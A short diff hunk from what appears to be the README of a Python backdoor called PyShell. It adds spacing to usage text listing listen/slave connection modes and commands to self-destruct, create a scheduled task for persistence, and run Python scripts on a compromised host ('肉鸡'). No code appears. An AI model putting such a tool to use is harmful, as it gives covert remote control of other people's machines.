@@ -6,10 +6,17 @@ python 后门程序
 使用方法:
 
 [HELP]  PyShell.exe [-listen(-slave)] [ip] [port]
+
 [HELP]  python PyShell.py [-listen(-slave)] [ip] [port]
+
 connection：
+
 [HELP]  exit    ----退出连接
+
 [HELP]  kill    ----退出连接并自毁程序
+
 [HELP]  playtask    ----创建计划任务
+
 [HELP]  python -p file.py    ----在肉鸡上执行本地python脚本
+
 
